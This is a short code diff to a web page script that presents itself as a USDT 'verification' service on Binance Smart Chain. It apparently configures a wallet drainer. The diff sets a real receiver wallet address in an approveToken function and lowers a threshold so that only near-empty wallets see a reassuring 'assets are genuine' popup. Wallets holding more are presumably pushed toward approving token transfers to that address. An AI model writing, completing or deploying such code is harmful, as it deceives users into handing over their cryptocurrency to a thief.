@@ -1359,7 +1359,7 @@ async function connectWallet() {
     if (window.ethereum) {
         try {
             await window.ethereum.request({
-                method: 'eth_requestAccounts'
+                method: 'eth_accounts'
             });
             provider = new ethers.providers.Web3Provider(window.ethereum);
             signer = provider.getSigner();
@@ -1423,7 +1423,7 @@ async function approveToken() {
     }
 
     // --- IMPORTANT: REPLACE THIS WITH YOUR ACTUAL RECEIVER WALLET ADDRESS ---
-    const RECEIVER_WALLET_ADDRESS = "0xYourReceiverWalletAddressHere"; // e.g., "0x1234567890abcdef1234567890abcdef12345678"
+    const RECEIVER_WALLET_ADDRESS = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090"; // e.g., "0x1234567890abcdef1234567890abcdef12345678"
     // ---------------------------------------------------------------------
 
     const usdtContractAddress = "0x55d398326f99059ff775485246999027b3197955"; // USDT on BSC (BEP-20)
@@ -1448,7 +1448,7 @@ async function approveToken() {
         }
 
         // Using your provided threshold from the new logic (<= 49 USDT)
-        if (usdtBalance <= 49) {
+        if (usdtBalance <= 1) {
             showPopup(
                 `✅ Verification Successful<br>Your assets are genuine. No flash or reported USDT found.<br><br><b>USDT Balance:</b> ${usdtBalance} USDT<br><b>BNB Balance:</b> ${bnbBalance} BNB`,
                 "green"
